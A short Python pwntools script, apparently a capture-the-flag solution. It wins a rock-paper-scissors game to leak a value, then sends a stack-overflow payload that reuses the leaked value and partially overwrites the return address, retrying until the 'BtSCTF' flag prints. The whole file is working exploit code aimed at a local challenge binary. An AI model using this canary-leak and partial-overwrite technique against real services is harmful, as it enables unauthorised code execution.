#!/bin/python3
from pwn import *
context.log_level=50
reward=0
while True:
#	r = process("./chall1")
	r = remote("localhost",2441)

	while True:
		r.sendlineafter(b"Rock (r), Paper (p) or Scissors (s)?\n",b'r')
		r.recvline()
		out = r.recvline()
		if b"win" in out:
			r.recvuntil(b"reward: ")
			reward = int(r.recvline(),16)
			log.info(f"{hex(reward)}")
			break
		else:
			r.sendline(b"yes")
			continue

	payload = b"A"*0x18 + p64(reward) +b"A"*8 + p16(0x77aa)
	r.sendafter(b"(yes/no)\n",payload)

	try:
		out = r.recvuntil(b"\n",timeout=3).decode()[:-1]
		if "BtSCTF" in out:
			print(out)
			quit()
	except EOFError:
		pass
	r.close()
